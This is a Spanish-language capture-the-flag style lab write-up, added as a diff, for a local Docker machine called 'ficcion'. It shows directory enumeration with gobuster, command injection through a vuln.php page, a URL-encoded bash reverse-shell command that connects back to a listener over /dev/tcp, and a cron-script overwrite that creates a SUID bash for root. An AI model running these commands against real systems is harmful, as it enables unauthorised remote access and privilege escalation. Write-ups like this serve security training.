@@ -1,0 +1,131 @@
+--------------- REPORTER FICCION ------------------------
+
+REALIZADO: Alfonso Company
+FECHA:23/06/2025
+
+
+-INDICE-
+1/ Reconocimiento
+2/ Explotación
+
+
+
+
+Entorno base
+• Accedes a la maquina por el navegador en: http://localhost:8080
+
+• Tambien puedes conectarte con docker exec -it mimaquina bash
+
+
+
+1. RCE vĆ­a vuln.php
+
+
+La pagina vuln.php ejecuta comandos del sistema que pasas por GET.
+
+Explotacion
+─(root㉿kali)-[/home/kali/ficcion]
+└─# gobuster dir -u http://172.17.0.2:80 -w /usr/share/wordlists/dirb/common.txt -x php
+
+para ver los directorios ocultos
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2:80
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 275]
+/.hta                 (Status: 403) [Size: 275]
+/.htpasswd            (Status: 403) [Size: 275]
+/.htaccess.php        (Status: 403) [Size: 275]
+/.htpasswd.php        (Status: 403) [Size: 275]
+/.htaccess            (Status: 403) [Size: 275]
+/.hta.php             (Status: 403) [Size: 275]
+/index.html           (Status: 200) [Size: 10918]
+/server-status        (Status: 403) [Size: 275]
+/vuln.php             (Status: 200) [Size: 0]
+Progress: 9228 / 9230 (99.98%)
+===============================================================
+Finished
+===============================================================
+
+vemos que nos aparece un directorio sospechoso   /vuln.php             (Status: 200) [Size: 0] 
+
+
+
+──(root㉿kali)-[/home/kali/ficcion]
+└─# curl "http://172.17.0.2:80/vuln.php?cmd=id" 
+
+✅ Resultado
+Salida de comandos como whoami, ls, etc.
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+
+Siguiente paso
+Usar esta vÃ­a para subir una reverse shell o explorar el sistema como www-data.
+
+Poner a la escuha con nc
+
+──(root㉿kali)-[/home/kali/ficcion]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+
+y luego lanzar 
+curl "http://172.17.0.2/vuln.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.136/4444%200%3E%261%27"
+
+
+con esto nos devolvera una reverse shell en el puerto a la escuha
+
+──(root㉿kali)-[/home/kali/ficcion]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.1.136] from (UNKNOWN) [172.17.0.2] 45906
+bash: cannot set terminal process group (23): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@6f50659f44f7:/var/www/html$ 
+
+bien ya estamos dentro..
+
+✅ Escalada de privilegios paso a paso:
+
+1 Reescribe el contenido del script cronjob.sh para crear un shell con SUID:
+
+Desde tu shell como www-data:
+
+echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /tmp/cronjob.sh
+
+chmod +x /tmp/cronjob.sh
+
+2/ ⏳ Espera 1 minuto (cron se ejecuta por minuto).
+
+3/ Ejecuta la shell SUID que ahora debe estar en /tmp/rootbash:
+
+/tmp/rootbash -p
+whoami
+root
+
+si ponemos el comando..
+# script /dev/null -c bash
+
+en principio no vuelve al usuario ,,
+www-data@659f436e70bd:/var/www/html$ whoami
+whoami
+www-data
+
+Volvemos a repetir el proceso 1 y despues vemos que ahora ya nos da un tti mas operativa..
+
+rootbash-4.4# 
+
+
+
+4 ✅ FINAL  bien ya somos root y finalizada la esclada de privilegios.
